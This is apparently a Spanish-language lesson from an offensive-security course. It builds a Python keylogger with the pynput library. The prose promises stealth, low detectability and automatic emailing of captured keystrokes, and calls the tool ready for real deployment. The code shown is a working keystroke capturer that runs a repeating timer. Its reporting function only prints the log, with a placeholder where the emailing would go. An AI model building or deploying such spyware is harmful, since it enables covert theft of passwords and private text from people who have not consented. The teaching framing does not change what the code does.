
----
- TAG: #Desarrollo #Keylogger #Parte2 
------
En esta clase, finalizaremos nuestra herramienta de keylogger desarrollada con la biblioteca **pynput** de Python. Esta sesión se centrará en perfeccionar y completar las funcionalidades del keylogger, asegurándonos de que sea eficiente, discreto y totalmente operativo.

El aspecto principal que abordaremos será la optimización del proceso de captura de pulsaciones de teclas y el mecanismo de envío automático de estas por correo electrónico. Refinaremos la programación para que el keylogger funcione de manera fluida y eficaz, minimizando su detectabilidad y maximizando la calidad y relevancia de los datos capturados. Además, nos aseguraremos de que el sistema de envío de correos electrónicos sea seguro y confiable, para que las pulsaciones registradas lleguen periódicamente a la dirección de correo especificada sin problemas.

También cubriremos aspectos avanzados, como la configuración de intervalos de tiempo para el envío de correos, la gestión de errores y la optimización del rendimiento del keylogger para garantizar que funcione de manera efectiva en diferentes escenarios. Al final de esta clase, tendrás una herramienta de keylogging robusta y práctica, lista para ser desplegada en situaciones reales de ciberseguridad ofensiva, con un entendimiento claro de cómo operarla y adaptarla a tus necesidades específicas.

-----

Seguimos con la configuración de nuestro script para poder configurarlo y enviarnos la información por correo :

```python
#!/usr/bin/python3

import pynput.keyboard
import threading

log = ""  # Variable global para almacenar las pulsaciones

def pressed_key(key):
    global log

    try:
        log += str(key.char)  # Almacenar caracteres comunes

    except AttributeError:
        # Manejo de teclas especiales
        special_keys = {
            key.space: " ", 
            key.backspace: " [Backspace] ", 
            key.enter: " [Enter] ", 
            key.shift: " [Shift] ", 
            key.ctrl: " [Ctrl] ", 
            key.alt: " [Alt] "
        }
        log += special_keys.get(key, f" [{str(key)}] ")

    print(log)  # Visualizar las pulsaciones almacenadas

def report():
    global log
    # Aquí es donde enviaríamos el contenido por correo
    print(f"Enviando log: {log}")
    
    log = ""  # Limpiamos el log para almacenar nuevas pulsaciones

    # Ejecutamos la función report cada 5 segundos
    timer = threading.Timer(5, report)
    timer.start()

# Configuración del listener de teclas
keyboard_listener = pynput.keyboard.Listener(on_press=pressed_key)

with keyboard_listener:
    report()  # Iniciar la función de envío en paralelo
    keyboard_listener.join()
```

